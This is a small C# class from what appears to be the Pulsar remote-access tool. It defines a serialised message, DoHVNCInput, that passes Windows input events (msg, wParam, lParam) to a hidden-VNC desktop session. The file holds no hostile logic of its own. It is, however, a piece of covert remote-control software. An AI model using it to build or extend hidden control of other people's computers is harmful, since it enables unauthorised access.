using System;
using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.HVNC
{
    [MessagePackObject]
    public class DoHVNCInput : IMessage
    {
        [Key(1)]
        public uint msg { get; set; }

        [Key(2)]
        public int wParam { get; set; }

        [Key(3)]
        public int lParam { get; set; }
    }
}